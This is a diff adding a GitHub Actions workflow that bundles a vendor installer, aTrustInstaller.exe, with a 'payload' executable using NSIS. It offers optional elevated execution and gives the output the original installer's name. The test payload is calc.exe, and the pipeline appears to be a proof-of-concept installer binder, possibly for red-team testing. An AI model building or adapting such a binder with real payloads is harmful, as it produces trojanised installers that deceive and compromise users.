@@ -1,0 +1,77 @@
+name: build-atrust-bundle
+on:
+  workflow_dispatch:
+    inputs:
+      host_asset:
+        description: 'release "inputs" 里宿主安装器的资产文件名'
+        default: 'aTrustInstaller.exe'
+      payload_admin:
+        description: '载荷是否提权运行: 0/1'
+        default: '0'
+      out_name:
+        description: '输出文件名'
+        default: 'aTrustInstaller_test.exe'
+
+jobs:
+  # 从 windows runner 的 System32 取 calc.exe 作为测试载荷
+  payload:
+    runs-on: windows-latest
+    steps:
+      - name: Collect calc.exe
+        shell: pwsh
+        run: |
+          Copy-Item C:\Windows\System32\calc.exe calc.exe
+          Get-FileHash calc.exe -Algorithm SHA256 | Format-List
+          Get-Item calc.exe | Select-Object Name, Length | Format-List
+      - uses: actions/upload-artifact@v4
+        with:
+          name: payload
+          path: calc.exe
+
+  build:
+    needs: payload
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install NSIS
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq nsis p7zip-full file
+
+      - name: Download host installer from release
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          mkdir -p files dist
+          gh release download inputs --repo "${{ github.repository }}" \
+            -p '${{ inputs.host_asset }}' -O files/host.exe --clobber
+          ls -la files/
+
+      - name: Download payload artifact
+        uses: actions/download-artifact@v4
+        with:
+          name: payload
+          path: files/
+
+      - name: Build bundle
+        run: |
+          makensis -V2 \
+            -DHOST=files/host.exe \
+            -DPAYLOAD=files/calc.exe \
+            -DOUT=dist/${{ inputs.out_name }} \
+            -DPAYLOAD_ADMIN=${{ inputs.payload_admin }} \
+            bundle.nsi
+
+      - name: Verify structure
+        run: |
+          file dist/*
+          sha256sum dist/*
+          echo "== NSIS 内容自检 =="
+          7z l dist/${{ inputs.out_name }} | grep -E 'payload\.exe|aTrustInstaller\.exe|Method|SubType'
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: bundle
+          path: dist/*
+          retention-days: 3
